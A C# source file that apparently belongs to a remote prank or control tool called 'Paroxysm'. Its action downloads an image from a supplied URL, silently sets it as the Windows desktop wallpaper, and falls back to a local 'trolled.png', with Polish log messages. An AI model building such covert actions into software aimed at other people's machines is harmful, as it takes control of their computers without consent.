using System.Net;
using Paroxysm.Debug;

namespace Paroxysm.Hooks.Actions;

public static class ChangeWallpaperAction
{
    [Obsolete("Obsolete")]
    private static async Task<bool> SetWallpaperFromUrl(string imageUrl)
    {
        try
        {
            using WebClient client = new();
            var localImagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "temp_wallpaper.jpg");
            await client.DownloadFileTaskAsync(new Uri(imageUrl), localImagePath);

            if (SetWallpaper(localImagePath))
            {
                Thread.Sleep(10000);
                File.Delete(localImagePath);
                return true;
            }

            Thread.Sleep(10000);
            File.Delete(localImagePath);
            return false;
        }
        catch (Exception ex)
        {
            Logger.CreateEmbed(ELoggerState.Error, ex);
            return false;
        }
    }

    private static bool SetWallpaper(string imagePath)
    {
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), imagePath);
        return HookStatement.SystemParametersInfo(HookStatement.SPI_SETDESKWALL, 0, path,
            HookStatement.SPIF_UPDATE | HookStatement.SPIF_CHANGE) != 0;
    }

    [Obsolete("Obsolete")]
    public static async void Follow(string? imageUrl)
    {
        if (await SetWallpaperFromUrl(imageUrl))
        {
            Logger.CreateEmbed(ELoggerState.Error, new Exception("Zdjęcie z linku ustawione jako tapeta"));
        }
        else
        {
            var localImagePath = "trolled.png";
            if (File.Exists(localImagePath))
            {
                SetWallpaper(localImagePath);
                Logger.CreateEmbed(ELoggerState.Error, new Exception("Lokalne zdjęcie ustawione jako tapete"));
            }
            else
            {
                Logger.CreateEmbed(ELoggerState.Error, new Exception("Nie udało sie ustawić tapety"));
            }
        }
    }
}